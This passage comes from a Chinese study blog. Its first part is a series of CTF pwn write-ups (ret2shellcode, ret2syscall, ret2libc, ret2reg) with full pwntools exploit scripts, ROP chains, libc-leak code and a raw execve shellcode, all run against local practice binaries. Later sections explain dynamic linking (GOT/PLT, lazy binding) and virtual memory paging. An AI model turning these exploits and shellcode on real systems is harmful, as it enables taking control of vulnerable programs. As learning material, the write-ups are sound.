src="https://gateway.pinata.cloud/ipfs/bafkreig6qvp33bybtjezfhlrbvwdhfnsdy5phercnxvsagclda6n4fhkfe" alt="函数调用栈示意图"></p><hr><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><em>没有system（“&#x2F;bin&#x2F;sh”）就创造一个出来！！</em></p><p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreih2w64dundco6wy4eltsf6eqlhc7dvwoziuiftnwe2wm2aaoss2vy" alt="1"><br>发现有可读可写可执行段<br>打开ida<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiha54ne2p5u7vjd2f6tdnmty5marlcqv4uar3muz4nwlnxxo4a5oq" alt="2"><br>&emsp;&emsp;有栈溢出，并且将s的数据拷贝到buf上，因为栈不可执行，所以我们可以把后门函数写入到buf上（buf位于.bss段），然后再通过栈溢出返回到buf，即可获得shell<br><em>emm似乎因为某些未知原因该题在我机子上显示.bss段不可执行，所以打不通，但是思路是没有问题的</em><br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">io.sendline(shellcode.ljust((<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>),<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更新：较旧的ubuntu版本可以复现（Ubuntu16，18）<br>ubuntu18 0x0804A000 rwx<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-08%20113749.png" alt="1"></p><p>若文件是64位的，需要加个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure><p>题目可输入的字长不够时，可以试试这个shellcode，只有23字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode：<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><em>简单的一次代码碎片利用</em><br><em>“震惊！！小小碎片竟然能够……”</em></p><p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihl4i3gaqkwx2z4spiu3lrtpx2btts3k7dhqzh7as5ymswb4krwue" alt="1"><br>开启了nx保护<br>再用ida看看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibbq5j2yegjl7gu4xxy4pcmg73w67ygpffvyd4b4ltg2yk73qh3wq" alt="2"><br>存在栈溢出，且有字符串“&#x2F;bin&#x2F;sh”，但是经过查找发现有可利用的代码片段，于是采用rop的思路，通过系统调用获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>利用这个系统调用，其系统调用号为<strong>0xb</strong>，elf的中断指令为<strong>int 0x80</strong><br>存放思路:<br>    eax  0xb<br>    ebx  binsh地址（0x080BE408）<br>    ecx 0<br>    edx 0<br>利用ROPgadget工具查找相应指令，如下：<br><img src="https://gateway.pinata.cloud/ipfs/bafkreifwgzhd46sjutyvoltbguv2cpvtktncqtgzxntar7owtio5jxvs4i" alt="ROPgadget"><br><img src="https://gateway.pinata.cloud/ipfs/bafybeifa62urkqgff7cxafghfy2kzm6r5ingclc2fx7ak4er2xo3qa7pye" alt="2"><br>找到俩能用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><em>一把梭： ROPgadget –binary filename – ropchain</em><br><em>可以自动帮我们写好exp，要注意的是，如果读入长度有限，就需要自己优化一下，或者手动</em></p><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p><em>“system和&#x2F;bin&#x2F;sh分床了，这可怎么办？”</em></p><p>经典操作<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibogkbi32mz557a25yhsskj4dmze2pcn6gtm5u4abw6kofp5kcmja" alt="1"><br><img src="https://gateway.pinata.cloud/ipfs/bafkreiguzbxmsejrmah7q66eyi74utjwdi7cwsj7gi7bwvecb2luhgfxue" alt="1"><br>开启了nx保护<br>有栈溢出，有&#x2F;bin&#x2F;sh，甚至还有system，但是此时system体内塞入了别的字符串<del>什么渣…</del><br>这时，我们就要用到plt表和got表了。<br>基本思路：利用栈溢出跳转到plt表中的system项，然后再通过其调用system函数，并传入参数”&#x2F;bin&#x2F;sh”，然后获得shell。<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), system_plt, <span class="string">&#x27;aaaa&#x27;</span>, binsh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中填入aaaa是为了返回一个虚假地址（在栈上占个位置用的）</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p><em>“&#x2F;bin&#x2F;sh被气走了，这可怎么办？”</em></p><p>还是经典操作（图懒得给了，<del>切屏切到手酸</del>）</p><p>总之有栈溢出，有buf2在.bss段，有gets函数，可以手动构造一个&#x2F;bin&#x2F;sh，然后再调用system函数，跟ret2libc1差不多</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), gets_plt, pop_ebx_ret, buf2, system_plt, <span class="string">&#x27;aaaa&#x27;</span>, buf2])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中，pop_ebx_ret起到两个作用，一个是充当gets函数的返回地址，另一个是它本身功能：将buf2从栈上pop掉，然后返回到system_plt，维持栈平衡<br>当然这里还有另外一种写法，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), gets_plt,system_plt, buf2, buf2])</span><br></pre></td></tr></table></figure><p>这样写，system_plt可以直接充当gets函数的返回地址，gets执行完毕后直接跳转到system_plt，然后先前栈上的buf2刚好充当system_plt的虚假返回地址（刚刚没有pop掉）</p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><em>“emmm没有sh也没有system，可利用的指令碎片也基本没有，这可真令人难受”</em></p><p>&emsp;&emsp;开启了nx保护，存在栈溢出，似乎没有别的东西了，怎么找到system函数地址呢？system函数属于libc，而libc.so 动态链接库中的函数之间相对偏移是固定的，那么只要得到libc中某个函数的地址，我们就可以得出system函数的地址<br>&emsp;&emsp;我们采用got表来泄露目标函数地址，由于libc的<strong>延迟绑定机制</strong>，我们需要泄漏已经执行过的函数的地址。本题我们泄露__libc_start_main函数的地址</p><p><del>emmmLibcSearcher这个工具不太好用，写这题的时候它并没有找到所需libc版本</del></p><p>这里推荐两个网站<br><a href="https://libc.rip/">https://libc.rip/</a><br><a href="https://libc.blukat.me/">https://libc.blukat.me/</a><br>这两个网站可以通过输入函数和对应地址末三位来查找当前使用的libc版本，并得到函数偏移量<br>如图<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiag7xsvssereo2odwqt4citu5aayu6tyzhqk3sbtcjojwnpkhrtme" alt="0"><br>有时候查找出来的libc版本会比较多，建议多加几个函数进去（条件允许的话），然后一个个试<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])<span class="comment">##泄露libc_start_main函数地址，并在泄露后回到main函数，即重新执行一遍程序</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">##接收libc_start_main函数地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr)) <span class="comment">##打印出libc_start_main函数地址，为了人工判断libc版本，以便在之后填入各个函数的偏移（所以确乎是要与主机交互两遍）</span></span><br><span class="line">libc_start_main=<span class="number">0x021560</span> <span class="comment">##纯手打hhh</span></span><br><span class="line">system=<span class="number">0x047cb0</span></span><br><span class="line">binsh=<span class="number">0x1b90f5</span></span><br><span class="line">libcbase = libc_start_main_addr - libc_start_main</span><br><span class="line">system_addr = libcbase + system</span><br><span class="line">binsh_addr = libcbase + binsh</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>后补：最近发现这个查偏移的网站好像用不了，然后加个给了libc的情况的exp（一般会给吧）,下面是打本地的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib32/libc.so.6&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; it !?&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">112</span>)+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_realaddr=u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_realaddr))</span><br><span class="line">libc_addr=puts_realaddr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=cyclic(<span class="number">112</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本地libc版本查找方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd filename</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20115222.png" alt="a"></p><p>And<br>像puts这些函数的got地址plt地址可以手动查询，通过ida（ctrl+s）<br>要注意got地址是.got.plt 而不是.got ， plt地址在.plt.sec 而不是.plt</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20195621.png" alt="a"></p><h3 id="64位的情况"><a href="#64位的情况" class="headerlink" title="64位的情况"></a>64位的情况</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Pls Input&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401293</span></span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_realaddr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#read函数的真实地址，由于真实地址总是从7f开始，故从7f开始接收，长度补足8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_realaddr))</span><br><span class="line">libc_addr=read_realaddr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret_addr=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总体上差不多，就是传参方式改变，前六个参数分别给rdi rsi rdx rcx r8 r9，以及需要注意栈对齐（第二个payload的ret就是为了栈对齐）</p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>顾名思义，就是控制程序执行流返回到寄存器。首先需要知道执行ret时（栈溢出后）指向缓冲区空间的是哪个寄存器，其次往缓冲区写入shellcode，然后将call [寄存器] 或者jmp [寄存器]指令地址填入retaddress，利用栈溢出完成攻击<br>实现前提，该缓冲区是RWX的</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接相关</title>
      <link href="/2024/03/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/03/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="为什么要动态链接-动态链接基本思想"><a href="#为什么要动态链接-动态链接基本思想" class="headerlink" title="为什么要动态链接&amp;&amp;动态链接基本思想"></a>为什么要动态链接&amp;&amp;动态链接基本思想</h2><p>&emsp;&emsp;静态链接对于计算机内存和磁盘空间的浪费十分严重，且一旦程序中有任何模块更新，整个程序就需要重新链接后再发布给用户，用户每次都需要重新下载这个程序<del>试想一下每次崩铁更新都要重新下载几十个G的文件那得多崩溃</del>动态链接很好的优化了以上两个问题。<br>&emsp;&emsp;其基本思想如下：把程序的各个模块分割成独立的文件，等到程序要运行时再将他们链接在一起，也就是将链接过程推迟。假设我们有program1.o、program2.o和lib.o三个目标文件。program1.o用到了lib.o，即program1.o依赖于lib.o，那么系统就会加载lib.o，如果他们还依赖于其他目标文件，那操作系统就再加载用到的文件，之后再进行链接工作，之后我们如果还需运行program2，系统只需加载program2，因为内存中已经存在一份lib.o<br>&emsp;&emsp;在Linux系统中，elf动态链接文件被称为<strong>动态共享对象</strong>（DSO，Dynamic Shared Objects），简称<strong>共享对象</strong>，一般以.so为扩展名。在Windows系统中则以.dll为扩展名（动态链接库）</p><h2 id="地址无关代码-PIC"><a href="#地址无关代码-PIC" class="headerlink" title="地址无关代码 (PIC)"></a>地址无关代码 (PIC)</h2><p>&emsp;&emsp;共享对象的最终装载地址在编译时是不确定的，那么我们如何确定它在进程虚拟空间中的位置？早期人们采用静态共享库，即手工分配各个模块的装载地址，但是单一个模块被多个程序使用，就容易导致地址冲突。比如模块a被一个人分配到0x1000到0x2000的位置，但是另外一个人用不到a，以为0x1000到0x2000是空闲的，就把b分配进去，这样就起冲突了，以后的人就不能同时使用a和b。<br>&emsp;&emsp;为了解决模块装载时固定地址的问题，我们提出一个设想：共享对象在编译时不能假设自己在进程虚拟空间中的位置。首先想到的方法就是类比静态链接中的重定位，只不过我们将重定位推迟至装载时进行，即<strong>装载时重定位</strong>，又叫<strong>基址重置</strong>。但该方法有个很大的缺点是指令部分无法在多个进程之间共享，这样便失去了动态链接的一大优势。我们的目标是希望指令共享的部分不需要因为装载地址的改变而改变，所以我们将指令部分中需要修改的部分分离出来，与数据部分合并，这样剩余部分可保持不变，而数据部分可以在每个进程中拥有一个副本，这种方法是被称为<strong>地址无关代码</strong>的技术。<br>模块中地址引用方式可分为四种</p><h3 id="类型一-模块内部调用或跳转"><a href="#类型一-模块内部调用或跳转" class="headerlink" title="类型一 模块内部调用或跳转"></a>类型一 模块内部调用或跳转</h3><p>被调函数与调用者都处于同一模块，这种指令不需要重定位，相对地址调用就可以了</p><h3 id="类型二-模块内部数据访问-（比如模块中定义的全局变量、静态变量）"><a href="#类型二-模块内部数据访问-（比如模块中定义的全局变量、静态变量）" class="headerlink" title="类型二 模块内部数据访问 （比如模块中定义的全局变量、静态变量）"></a>类型二 模块内部数据访问 （比如模块中定义的全局变量、静态变量）</h3><p>相对寻址，任何一条指令与它所需要访问的模块的数据之间的相对位置是固定的，只要当前指令地址（pc）加上偏移量就能得出数据地址了</p><h3 id="模块三-模块间数据访问"><a href="#模块三-模块间数据访问" class="headerlink" title="模块三 模块间数据访问"></a>模块三 模块间数据访问</h3><p>这个麻烦点，因为模块间的数据访问目标地址需要等到装载时才决定。elf文件的做法是在数据段内建立一个指向这些变量的指针数组，也称为<strong>全局偏移表</strong>（GOT表），当代码需要引用这些全局变量时，可以通过GOT表中相对应的项来间接引用。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihcypprhe7hi2662na3wquk27cjoa72yhvuxydholilndilk37pai" alt="got"><br>计算方式：通过pc值加上一个偏移量得到GOT表的位置，再根据变量地址在GOT表中的偏移就可以得到变量的地址</p><h3 id="模块四-模块间调用、跳转-（比如其他模块定义的全局变量）"><a href="#模块四-模块间调用、跳转-（比如其他模块定义的全局变量）" class="headerlink" title="模块四 模块间调用、跳转 （比如其他模块定义的全局变量）"></a>模块四 模块间调用、跳转 （比如其他模块定义的全局变量）</h3><p>同三，就是把变量地址换成函数地址</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>以地址无关方式编码的可执行文件被称为地址无关可执行文件（PIE）</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>&emsp;&emsp;在动态链接下，程序模块之间包含了大量的函数调用，所以程序在开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找和重定位，这会牺牲性能。而很多函数在实际运行中很少甚至不会用到，为了提高性能，ELF采用了一种叫做<strong>延迟绑定</strong>的机制。其基本思想就是程序在第一次被用到时才绑定（符号查找、重定位等）<br>&emsp;&emsp;ELF采用PLT（Procedure Linkage Table）的方法来实现。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreif23cst3rfzw36mj7h3wptjifuvgztz4gx5ccjbvkenajvcrnjule" alt="plt"><br>如图，调用函数的方式在got表的基础上再加一层，先通过plt表查询函数在got表对应的项的地址，再通过got表进行间接寻址，如果是第一次调用函数，got表是没有函数地址的，需要plt表去绑定该函数（其中需要用到plt表中的前三个参数），之后got表就有对应函数的地址了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈内存管理</title>
      <link href="/2024/03/13/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2024/03/13/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="虚拟寻址"><a href="#虚拟寻址" class="headerlink" title="虚拟寻址"></a>虚拟寻址</h2><p>&emsp;&emsp;计算机的最基本体系结构就是CPU加上内存，CPU负责计算，内存负责存储临时的计算数据，<del>当然实际的模型要复杂得多</del>，那么，问题来了，CPU如何准确获取内存上的数据呢？<br>&emsp;&emsp;我们先将内存假设成一个字节数组的模型</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreifcdev7tskluynnkpk2ykvms5ekxazri7fh225reifpifgz34kmsa" alt="1">  </p><p>&emsp;&emsp;很容易可以得出一个简单粗暴的方法——物理寻址。<del>就是照着内存的地址直接找</del>。显然，这种寻址方式会导致许多问题，如不支持多进程同时进行（<em>会导致不同进程之间的越级访问，互相篡改数据啥的</em>）。所以我们现在采取另外一种寻址方式——<strong>虚拟寻址</strong>。<br>&emsp;&emsp;虚拟寻址涉及到另外一个抽象概念——虚拟地址空间。虚拟内存由虚拟地址组织起来，它使得每个进程都单独的使用整个主存（从进程的角度来看），并且每个进程所看到的内存都是一模一样的，该内存空间称为<strong>虚拟地址空间</strong><br><br>&emsp;&emsp;举个栗子<br><br>&emsp;&emsp;如图<br><img src="https://gateway.pinata.cloud/ipfs/bafybeig67xfhfbcb5q3wnc6uwh73zsuh73ir5ngvsvavretrevaipys3qi" alt="2"><br>&emsp;&emsp;其中，DRAM就是我们平时所说的内存（<em>比如某台笔记本的内存为32GB</em>），这个内存是实实在在的物理内存，但是对于每个进程来说，他们所看到的是虚拟内存（对于32位操作系统，其大小为4GB）<del>至于为什么是4GB请自行百度</del><br>&emsp;&emsp;负责虚拟地址到物理地址的转换的是一个叫做MMU( memory manage unit , 虚拟内存管理单元) 的硬件。每当CPU需要访问物理内存时，都会产生一个虚拟地址，这个虚拟地址被 MMU 翻译成物理内存地址。</p><h2 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h2><p>&emsp;&emsp;早期人们采用的方法是<strong>内存分段</strong>，即把一段与程序所需空间大小相等的虚拟内存映射到等大小的物理内存上，如图。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiand6xkgvano4tg6fmtxksflgw4f3a7zy7cffgff42vbil7lyf62u" alt="new"><br>但是这样子做效率低下，倘若内存不够了，需要先将原先内存里暂时不用的段拿出来放到磁盘（因为是对照一整个程序的段，所以这个段会很大，读写费时间）。于是我们采取新的方式————内存分页。</p><h2 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h2><p>&emsp;&emsp;为了方便地址的管理和调用，Linux采取内存分页的方式。即将物理内存划分为固定大小的页（物理页【Physical Page】），通常是4KB或者2MB。每个进程的虚拟地址空间也被划分为相同大小的页(虚拟页【Vistural Page】)。通过<strong>页表</strong>（Page Table）来记录虚拟页和物理页的映射关系。当进程访问虚拟地址时，操作系统会根据页表将虚拟页映射到物理页上，从而实现地址转换</p><h3 id="页表（提一嘴）"><a href="#页表（提一嘴）" class="headerlink" title="页表（提一嘴）"></a>页表（提一嘴）</h3><p>页表是一个结构为PTE(Page Table Entry) 的数组。页表中的每一个表项都存储了一个虚拟页到物理页的映射。</p><hr><p>&emsp;&emsp;根据虚拟页是否分配了物理页和是否缓存的角度来区分，虚拟内存页有三种：<br>    （1）.未分配物理页<br>    （2）.已分配物理页但未缓存<br>    （3）.已分配物理页且已缓存</p><p>&emsp;&emsp;（常用的页会放在内存中，不常用的会写入磁盘<del>毕竟内存是有限的嘛</del>）为了区分这三种情况，页表中有一个<ins>有效标志位</ins>,和一个<ins>指向物理内存的地址</ins>。 